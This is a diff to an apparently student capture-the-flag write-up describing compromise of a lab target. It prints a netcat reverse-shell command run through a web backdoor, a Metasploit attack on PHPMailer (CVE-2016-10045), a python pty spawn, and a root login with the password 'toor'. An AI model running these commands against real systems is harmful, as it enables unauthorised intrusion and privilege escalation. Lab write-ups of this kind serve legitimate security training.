@@ -246,6 +246,8 @@ In the browser, used the backdoor to run:
 
 nc <Kali IP> 4444 -e /bin/bash. For example, your query string will look like cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash.
     
+   ![listenerbackdoor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listenerbackdoor.png "listener")     
+    
  ![listener](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listener1.png "listener")   
 
 Using the shell  opened on Target 2, found a flag in the WordPress uploads directory /var/www.
@@ -261,7 +263,33 @@ Opened the flag in the browser window.
     
   ![flag3](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3target2.png "flag3")     
 
+Used Metasploit options for a successful attack against phpmailer.
+Got a meterpreter shell from the vulnerable machine.
+The PHPMailer exploit is fairly straightforward. CVE-2016-10045 describes the details of the vulnerability. 
 
+    ![msfconsole](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/msfconsole.png "msfconsole")   
+    
+    Used option 1 and got access to the mailer.
+    
+ ![mailer](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/mailer.png "mailer")   
+    
+    Used the python script and su root to escalate the privilges to the root user.
 
-
-
+     - ` python -c 'import pty;pty.spawn("/bin/bash")' `
+     -  `su root`
+     - `passwd:toor'
+    
+   ![flag4](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag4target2.png "flag4")    
+    
+    Got root access to traget to, via directory traversal accessed the flag 4.
+    
+    ** Flag4 **
+    - 'cat flag4.txt`
+    
+    ![flag4](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/catflag4.png "flag4")    
+    
+    
+    
+    
+    
+    
